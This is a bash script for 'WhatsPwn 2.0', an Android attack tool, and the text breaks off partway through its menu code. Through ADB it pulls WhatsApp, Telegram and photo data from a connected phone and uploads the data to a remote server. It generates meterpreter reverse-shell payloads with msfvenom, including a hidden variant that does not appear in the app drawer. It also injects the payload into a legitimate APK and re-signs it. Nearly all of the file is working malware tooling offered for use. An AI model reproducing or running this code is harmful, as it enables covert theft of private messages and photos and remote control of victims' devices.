#!/bin/bash

##############################################################################
# WhatsPwn 2.0 Copyright (C) 2016  José Luis Rodríguez Fragoso               #
#                                                                            #
#    This program is free software: you can redistribute it and/or modify    #
#    it under the terms of the GNU General Public License as published by    #
#    the Free Software Foundation, either version 3 of the License, or       #
#    (at your option) any later version.                                     #
#                                                                            #
#    This program is distributed in the hope that it will be useful,         #
#    but WITHOUT ANY WARRANTY; without even the implied warranty of          #
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
#    GNU General Public License for more details.                            #
#                                                                            #
#    You should have received a copy of the GNU General Public License       #
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                            #
#   José Luis Rodríguez Fragoso                                              #
#   jlrodriguezfragoso@gmail.com                                             #
##############################################################################

# COLOR MATCHING
NONE='\033[0m'
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
#######################################################################################################################
#                                                    SUBFUNCTIONS                                                     #
#######################################################################################################################
# EXIT TRAP CTRL + C
EXITCODE() {
	${WDIR}/bin/adb kill-server
	rm -r ${WDIR}/tmp/
	clear
	exit
}

# CHECK IF AUTO MODE IS ENABLED, IF SO, PROMPT FOR ALL CONFIGURATION VARIABLES.
CHKAUTO() {
	if [[ ${AUTOMODE} == "1" ]]; then
		# IF THE OPTION CHOSEN BEFORE WAS JUST EXTRACTION
		if [[ ${MENU} -eq 4 ]]; then
			NAME_PROMPT
			DCIM_PROMPT
			BACKUP_PROMPT
			UPLOAD_PROMPT
			case "UPLOADYN" in
				Y|y|yes|YES) SSHPASS_PROMPT ;;
			esac
		# IF IT WAS FULL
		else
			PAYLOAD_PROMPT
			BLACKHOLE_PROMPT
			NAME_PROMPT
			case "$BACKHOLE" in
				Y|y|yes|YES) DCIM_PROMPT ;;
			esac
			BACKUP_PROMPT
			UPLOAD_PROMPT
			case "UPLOADYN" in
				Y|y|yes|YES) SSHPASS_PROMPT ;;
			esac
		fi
	fi
}

# ERROR IN CONNECTION
FAIL_MSG(){
	echo -e "\n${RED}YOU ARE NOT CONNECTED${NONE}" && echo -e -n "\nPress any key to continue ..." && read -n 1
	ATTACKS_INTERFACE
}
#######################################################################################################################
#                                                   MAIN FUNCTIONS                                                    #
#######################################################################################################################
#FULL ATTACK ### UNFINISHED
FULL_ATTACK() {
	if [[ -n $CONNECTED ]]; then
		# INSTALLS PAYLOAD
		if [[ -n $PAYLOAD ]]; then
			${WDIR}/bin/adb install ${PAYLOAD} && ${WDIR}/bin/adb shell am start ${USER} -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
		fi
		# INSTALL ANDROID LOCKSCREEN BYPASS

	else
		FAIL_MSG
	fi
}

# LAUNCH SHELL
SHELL() {
	if [[ -n $CONNECTED ]]; then
		${WDIR}/bin/adb shell && ATTACKS_INTERFACE
	else
		FAIL_MSG
	fi
}

# RESTORE WHATSAPP
RESTORE() {
	if [[ -n $CONNECTED ]]; then
		${WDIR}/bin/adb install -r -d ${WDIR}bin/WhatsApp_Backup.apk && ATTACKS_INTERFACE
	else
		FAIL_MSG
	fi
}

# EXTRACTION
EXTRACTION() {
	if [[ -z $CONNECTED ]]; then
		echo -e "${BOLD}EXTRACTING DATA ... ${GREEN}[OK]${NONE}"
		mkdir -p ${PATHEXT}extracted/${NAME}/WhatsApp
		${WDIR}/bin/adb pull "/sdcard/WhatsApp/Media" ${PATHEXT}extracted/${NAME}/WhatsApp
		${WDIR}/bin/adb pull "/sdcard/Android/data/com.whatsapp/files" ${PATHEXT}extracted/${NAME}/WhatsApp
		mkdir -p ${PATHEXT}extracted/${NAME}/Telegram
		${WDIR}/bin/adb pull "/sdcard/Telegram/Telegram Images" ${PATHEXT}extracted/${NAME}/Telegram
		${WDIR}/bin/adb pull "/sdcard/Android/data/org.telegram.messenger/cache" ${PATHEXT}extracted/${NAME}/Telegram
		mkdir -p ${PATHEXT/}extracted/${NAME}/Pictures
		${WDIR}/bin/adb pull "/sdcard/Pictures" ${PATHEXT}extracted/${NAME}/Pictures
		case "$DCIM" in
			Y|y|yes|YES) echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}"
							mkdir -p ${PATHEXT}extracted/${NAME}/DCIM
							${WDIR}/bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM
							WHATSUSED ;;
			N|n|no|NO) echo -e "${BOLD}SKIPPING DCIM PHOTOS ... ${GREEN}[OK]${NONE}" && WHATSUSED ;;
			*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES"
				echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}"
				mkdir -p ${PATHEXT}extracted/${NAME}/DCIM
				${WDIR}/bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM
				WHATSUSED ;;
		esac
	else
		FAIL_MSG
	fi

}

# UPLOAD FILES
UPLOAD() {
	if [[ ! -d ${PATHEXT}extracted ]]; then
		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
			echo -e "${RED}THERE ARE NO EXTRACTED FILES OR FOLDERS${NONE}"
			echo -e -n "\nPress any key to continue ..." && read -n 1
		else
			echo -e "${BOLD}ONLY BACKUP COMPRESSED FILE FOUND${NONE}"
			CMND
			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
			echo -e -n "\nPress any key to continue ..." && read -n 1
		fi
	else
		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
			echo -e "${BOLD}ONLY EXTRACTED FOLDER FOUND"
			CMND
			sshpass -p ${SSHPASS} scp -cr blowfish ${PATHEXT}extracted/ ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
		else
			echo -e "${BOLD}BOTH BACKUP FILE AND EXTRACTED FOLDER FOUND...UPLOADING ZIP"
			CMND
			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
		fi
	fi
	if [[ $USEINTERFACE == "Y" ]]; then
			MAIN_INTERFACE
		else
			exit 0
	fi
}

# INJECT METERPRETER INTO LEGITIMATE APK
INJECTION(){
	VISIBLE_INJECTION() {
		if [[ -z $PAYLOAD_IP ]]; then
			echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${CYAN}${SERV}${NONE}${BOLD}]: ${NONE}"
			read PAYLOAD_IP
		fi
		if [[ -z $PAYLOAD_PORT ]]; then
			echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}]: ${NONE}"
			read PAYLOAD_PORT
		fi
		if [[ -z $PAYLOAD_NAME ]]; then
			echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- [${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}]: ${NONE}"
			read PAYLOAD_NAME
		fi
		echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
		msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk
		java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
		PAYLOAD="${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk"
		echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
		echo -e "[${PAYLOAD}]"
		PAYLOAD_INT
	}

if [[ -z $LEGITIMATE_APK ]]; then
	echo -e -n "${CYAN}WP${NONE}> ${BOLD}ENTER THE LEGITIMATE APK TO USE WITH FULL PATH: ${NONE}"
	read LEGITIMATE_APK
fi
if [[ -z $PAYLOAD ]]; then
	echo -e "               ${NONE}NO PAYLOAD WAS SPECIFIED IN CONFIG FILE, HOWEVER ...${NONE}"
	if [ `find ${WDIR}/bin/Payloads/Signed -prune -empty` ];then
		echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${NONE}${BOLD}]: ${NONE}"
		read CREATE_PAYLOAD
		case "$CREATE_PAYLOAD" in
			y|Y|YES|yes) echo -e -n "${CYAN}WP${NONE}> ${BOLD}HIDDEN OR VISIBLE? [${CYAN}H${NONE}${BOLD}/${CYAN}V${NONE}${BOLD}]: ${NONE}" && read HV
			case "$HV" in
				H|h) HIDDEN_INJECTION ;;
				v|V) VISIBLE_INJECTION ;;
			esac ;;
			N|n|NO|no) PAYLOAD_INT ;;
		esac
	else
		NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
		echo -e "\n${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
		echo -e "${CYAN}WP${NONE}> ${BOLD}ENTER THE NUMBER OF THE PAYLOAD YOU WANT TO USE:${NONE}"
		select PAYLOAD_NAME in `ls -l ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}' | rev | cut -b 5- | rev`; do
			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
			echo -e "${BOLD}PLEASE WAIT ...${NONE}"
			break
		done
	fi
fi

injected_apk=$(basename "$LEGITIMATE_APK" .apk)
injected_apk="${injected_apk}_bd.apk"

# MODIFIED CODE FROM SkullTech
/usr/bin/env ruby -W0 - <<EORUBY
require 'nokogiri'
require 'fileutils'
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end
def scrapeFilesForLauncherActivity()
	smali_files||=[]
	Dir.glob('${WDIR}/bin/Payloads/Legitimate/smali*/**/*.smali') do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
	smali_files.each{|s_file|
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end
def fix_manifest()
	payload_permissions=[]
	File.open("${WDIR}/bin/Payloads/Payload/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	}
	original_permissions=[]
	apk_mani=''
	File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		original_manifest=Nokogiri::XML(k)
		permissions = original_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			original_permissions << name.to_s
		end
	}
	add_permissions=[]
	for permission in payload_permissions
		if !(original_permissions.include? permission)
			add_permissions << permission
		end
	end
	inject=0
	new_mani=""
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end
apkfile="$LEGITIMATE_APK"
unless(apkfile && File.readable?(apkfile))
	exit(1)
end
`apktool d -f ${LEGITIMATE_APK} -o ${WDIR}/bin/Payloads/Legitimate`
`apktool d -f ${PAYLOAD} -o ${WDIR}/bin/Payloads/Payload`
f = File.open("${WDIR}/bin/Payloads/Legitimate/AndroidManifest.xml")
amanifest=Nokogiri::XML(f)
f.close
launcheractivity = findlauncheractivity(amanifest)
smalifile = '${WDIR}/bin/Payloads/Legitimate/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
begin
	activitysmali = File.read(smalifile)
rescue Errno::ENOENT
	begin
		results=scrapeFilesForLauncherActivity()
		smalifile=results[0]
		activitysmali=results[1]
	rescue
		exit(1)
	end
end
FileUtils.mkdir_p('${WDIR}/bin/Payloads/Legitimate/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('${WDIR}/bin/Payloads/Payload/smali/com/metasploit/stage/Payload*.smali'), '${WDIR}/bin/Payloads/Legitimate/smali/com/metasploit/stage/'
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
File.open(smalifile, "w") {|file| file.puts hookedsmali }
fix_manifest()
`apktool b -f ${WDIR}/bin/Payloads/Legitimate -o ${WDIR}/bin/Payloads/${injected_apk}`
`java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/${injected_apk} $WDIR/bin/Payloads/Signed/${injected_apk}`
EORUBY
if [[ -f $WDIR/bin/Payloads/Signed/$injected_apk  ]]; then
	echo -e "${BOLD}DONE! HERE IS THE INFECTED APK: [${CYAN}$WDIR/bin/Payloads/Signed/$injected_apk${NONE}${NONE}${BOLD}]${NONE}"
	echo -e -n "\nPress any key to continue ..." && read -n 1
	PAYLOAD_INT
else
	echo -e "${RED}ERROR. CANNOT INJECT CODE.${NONE}"
	echo -e -n "\nPress any key to continue ..." && read -n 1
fi
}

#HIDDEN
HIDDEN() {
	if [[ -z $PAYLOAD_IP ]]; then
		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO ${CYAN}${SERV}${NONE}${BOLD}: ${NONE}"
		read PAYLOAD_IP
	fi
	if [[ -z $PAYLOAD_PORT ]]; then
		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT ${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}: ${NONE}"
		read PAYLOAD_PORT
	fi
	if [[ -z $PAYLOAD_NAME ]]; then
		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- ${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}: ${NONE}"
		read PAYLOAD_NAME
	fi
	echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk
	apktool d ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk -o ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME} > /dev/null
	mv ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/AndroidManifest.xml ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/Manifest.xml
	grep -v '<category android:name="android.intent.category.LAUNCHER">' ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/Manifest.xml > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/AndroidManifest.xml
	rm ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}/Manifest.xml
	apktool b -f ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME} -o ${WDIR}/bin/Payloads/unsigned_hidden_${PAYLOAD_NAME}.apk > /dev/null
	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_hidden_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/hidden_${PAYLOAD_NAME}.apk
	PAYLOAD="${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk"
	echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
	echo -e "${BOLD}DONE! HERE IS THE HIDDEN PAYLOAD: [${CYAN}${PAYLOAD}${NONE}${NONE}${BOLD}]${NONE}"
	echo -e -n "\nPress any key to continue ..." && read -n 1
	PAYLOAD_INT
}

# VISIBLE
VISIBLE() {
	if [[ -z $PAYLOAD_IP ]]; then
		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO ${CYAN}${SERV}${NONE}${BOLD}: ${NONE}"
		read PAYLOAD_IP
	fi
	if [[ -z $PAYLOAD_PORT ]]; then
		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT ${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}: ${NONE}"
		read PAYLOAD_PORT
	fi
	if [[ -z $PAYLOAD_NAME ]]; then
		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- ${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}: ${NONE}"
		read PAYLOAD_NAME
	fi
	echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_visible_${PAYLOAD_NAME}.apk
	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_visible_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/visible_${PAYLOAD_NAME}.apk
	PAYLOAD="${WDIR}/bin/Payloads/Signed/visible_${PAYLOAD_NAME}.apk"
	echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
	echo -e "${BOLD}DONE! HERE IS THE VISIBLE PAYLOAD: [${CYAN}${PAYLOAD}${NONE}${NONE}${BOLD}]${NONE}"
	echo -e -n "\nPress any key to continue ..." && read -n 1
	PAYLOAD_INT
}

# RELAUNCH OR INSTALL PAYLOAD INTO DEVICE
RELAUNCH() {
	INSTALL(){
		if [[ -n $CONNECTED ]]; then
			echo -e "${NONE}INSTALLING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
			${WDIR}/bin/adb install ${PAYLOAD}
			echo -e "${NONE}INITIALIZING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
			${WDIR}/bin/adb shell am start ${USER} -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
		else
			FAIL_MSG
		fi
	}
	if [[ -z $PAYLOAD ]]; then
		if [ `find ${WDIR}/bin/Payloads/Signed -prune -empty` ];then
			echo -e "${RED}COULD NOT FIND ANY PAYLOAD${NONE}"
			echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${NONE}${BOLD}]: ${NONE}"
			read CREATE_PAYLOAD
			case "$CREATE_PAYLOAD" in
				 y|Y|YES|yes) echo -e -n "${CYAN}WP${NONE}> ${BOLD}HIDDEN OR VISIBLE? [${CYAN}H${NONE}${BOLD}/${CYAN}V${NONE}${BOLD}]: ${NONE}" && read HV
				case "$HV" in
					H|h) HIDDEN && INSTALL ;;
					v|V) VISIBLE && INSTALL ;;
				esac ;;
				N|n|NO|no) PAYLOAD_INT ;;
			esac
		else
			NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
			echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
			echo -e "${CYAN}WP${NONE}> ${BOLD}ENTER THE NUMBER OF THE PAYLOAD YOU WANT TO USE:${NONE}"
			select PAYLOAD_NAME in `ls -l ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}' | rev | cut -b 5- | rev`; do
				PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
				INSTALL
			done
		fi
	else
		INSTALL
	fi
}
#######################################################################################################################
#                                                     INTERFACES                                                      #
#######################################################################################################################
# PAYLOAD INTERFACE
PAYLOAD_INT() {
	unset PAYLOAD
	unset PAYLOAD_NAME
	. ${WDIR}/config
	if [[ ! -d ${WDIR}/bin/Payloads/Signed/ ]]; then
		mkdir -p ${WDIR}/bin/Payloads/Signed/
	fi
	clear
	cat ${WDIR}/bin/motd
	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?\n
	[${CYAN}1${NONE}${NONE}${BOLD}]${NONE} INJECT METERPRETER PAYLOAD INTO LEGITIMATE APK
	${BOLD}[${CYAN}2${NONE}${NONE}${BOLD}]${NONE} CREATE HIDDEN METERPRETER PAYLOAD [NOT VISIBLE IN DRAWER]
	${BOLD}[${CYAN}3${NONE}${NONE}${BOLD}]${NONE} CREATE A VISIBLE METERPRETER PAYLOAD [VISIBLE METASPLOIT ICON]
	${BOLD}[${CYAN}r${NONE}${NONE}${BOLD}]${NONE} RETURN TO PREVIOUS MENU
	${BOLD}[${CYAN}x${NONE}${NONE}${BOLD}]${NONE} EXIT"
	echo -e -n "\n${CYAN}WP${NONE}> "
	read MENU
	case "$MENU" in
		1) INJECTION ;;
		2) HIDDEN ;;
		3) VISIBLE ;;
		r|R) MAIN_INTERFACE ;;
		x|X) exit 0 ;;
		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && PAYLOAD_INT ;;
	esac
}
#######################################################################################################################
# MAIN INTERFACE
MAIN_INTERFACE() {
	clear
	# LICENSE AGREEMENT PROMPT
	while true; do
		if grep "I accept" ${WDIR}/.LicenseAgreed > /dev/null; then
			break
		else
			clear
			cat << EOF > ${WDIR}/.LicenseAgreement
WhatsPwn  Copyright (C) 2016  José Luis Rodríguez Fragoso
This program comes with ABSOLUTELY NO WARRANTY; for details type 'w'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'c' for details.
EOF
			# DISPLAY LICENSE AGREEMENT PROMPT
			cat ${WDIR}/.LicenseAgreement
			echo -e -n "\n${BOLD}Do you accept the rights? ${NONE}${BOLD}[Y/N/W/C]: ${NONE}"
			read license
		        case "$license" in
		        	# OPTIONS AND ARGUMENTS FOR LICENSE
		        	Y|y|yes|YES|Yes|yES|yeS|YEs|YeS) cat << EOF > ${WDIR}/.LicenseAgreed
I accept
EOF
					break ;;
		        	N|n|NO|no|No|nO) echo "I do NOT accept" > ${WDIR}/.LicenseAgreed && exit ;;
					# WARRANTY W OPTION
		        	W|w) echo -e "\n" && cat << EOF > ${WDIR}/.LicenseAgreement
THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.
EOF
					cat ${WDIR}/.LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1 ;;
				# FULL LICENSE C OPTION [CONDITIONS]
				C|c) cat ${WDIR}/LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1 ;;
				esac
		fi
	done
# END OF LICENSE AGREEMENT PROMPT

# INTERFACE INIT
	clear
	cat ${WDIR}/bin/motd
	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?\n
	[${CYAN}1${NONE}${NONE}${NONE}${BOLD}]${NONE} ATTACKS
	${BOLD}[${CYAN}2${NONE}${NONE}${BOLD}]${NONE} PAYLOADS
	${BOLD}[${CYAN}3${NONE}${NONE}${BOLD}]${NONE} UPLOAD FILES TO SERVER
	${BOLD}[${CYAN}x${NONE}${NONE}${BOLD}]${NONE} EXIT"
	echo -e -n "\n${CYAN}WP${NONE}> "
	read MENU
	case "$MENU" in
		1) ATTACKS_INTERFACE ;;
		2) PAYLOAD_INT ;;
		3) UPLOAD ;;
		x|X) exit 0 ;;
		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && MAIN_INTERFACE ;;
	esac
}
#######################################################################################################################
# MAIN ATTACKS INTERFACE
ATTACKS_INTERFACE() {
	# ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
	while true; do
		# CHECK IF DEVICE IS NOT CONNECTED AND WAITS FOR IT
		if [[ ! -f ${WDIR}/tmp/ADB_Devices ]]; then
				echo -e "${BOLD}CONNECT THE DEVICE${NONE}\n"
				${WDIR}/bin/adb start-server > /dev/null
				${WDIR}/bin/adb wait-for-device > /dev/null
		fi
		# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
		${WDIR}/bin/adb devices > ${WDIR}/tmp/ADB_Devices
		# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE
		IP=$(grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" ${WDIR}/tmp/ADB_Devices)
		# IF IP VARIABLE IS SET THEN IT IS CONNECTED WIRELESSLY
		if [[ -n "$IP" ]]; then
			CONNECTED=1
			STATUS="${GREEN}CONNECTED${NONE} IP = [${CYAN}${IP}${NONE} IF YOU HAVE YOUR DEVICE CONNECTED TO CABLE, DISCONNECT IT.]"
			# REMOVE ADB _Devices FILE TO AVOID ENTERING ABOVE IF STATEMENT
			rm -f ${WDIR}/tmp/ADB_Devices
			# BREAK THE CYLCE
			break
		else
			# IF IP IS NOT SET, CHECK IF DEVICES IS CONNECTED LOCALLY ONLY
			if [ `grep -oE "device" ${WDIR}/tmp/ADB_Devices` ]; then
				# GET DEVICE IP WHILE ITS STILL CONNECTED
				DEVICE_IP=$(${WDIR}/bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)
				# ATTEMPT TO CONNECT WIRELESSLY
				${WDIR}/bin/adb tcpip 5555
				# ATTEMPT WIRELESS CONNECTION IF NOT CONNECTED
				if [ ! `${WDIR}/bin/adb connect ${DEVICE_IP}:5555 | grep "connected to ${DEVICE_IP}" -oE` ]; then
					# IF NOT CHECK IF IT IS STILL CONNECTED TO USB
					if [ `${WDIR}/bin/adb devices | grep "device" -oE` ]; then
						# IF IT IS, DISPLAY CONNECTED LOCALLY
						CONNECTED=1
						STATUS="${GREEN}CONNECTED ${CYAN}LOCALLY"
						# REMOVE ADB DEVICES FILE
						rm -f ${WDIR}/tmp/ADB_Devices
						# BREAK THE CYCLE
						break
					else
						# IF IT IS NOT CONNECTED TO USB SET DISCONNECTED, REMOVE ADB FILE AND CLEAR VARIABLE BUT DO NOT BREAK CYCLE TO KEEP ATTEMPTING CONNECTING
						unset CONNECTED
						STATUS="${RED}DISCONNECTED${NONE}"
						rm -f ${WDIR}/tmp/ADB_Devices
					fi
				fi
			fi
		fi
	done
	# INTERFACE INIT
	#clear
	cat ${WDIR}/bin/motd
	echo -e "\n                                                 DEVICE STATUS: ${STATUS}"
	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?\n
	[${CYAN}1${NONE}${NONE}${NONE}${BOLD}]${NONE} FULL ATTACK
	${BOLD}[${CYAN}2${NONE}${NONE}${BOLD}]${NONE} LAUNCH SHELL
	${BOLD}[${CYAN}3${NONE}${NONE}${BOLD}]${NONE} EMERGENCY RESTORE WHATSAPP
	${BOLD}[${CYAN}4${NONE}${NONE}${BOLD}]${NONE} ONLY EXTRACT SENSITIVE DATA
	${BOLD}[${CYAN}5${NONE}${NONE}${BOLD}]${NONE} INSTALL OR RELAUNCH PAYLOAD IN DEVICE
	${BOLD}[${CYAN}r${NONE}${NONE}${BOLD}]${NONE} RETURN TO MAIN MENU
	${BOLD}[${CYAN}x${NONE}${NONE}${BOLD}]${NONE} EXIT"
	echo -e -n "\n${CYAN}WP${NONE}> "
	read MENU
	case "$MENU" in
		1) CHKAUTO && FULL_ATTACK && ATTACKS_INTERFACE ;;
		2) SHELL && ATTACKS_INTERFACE ;;
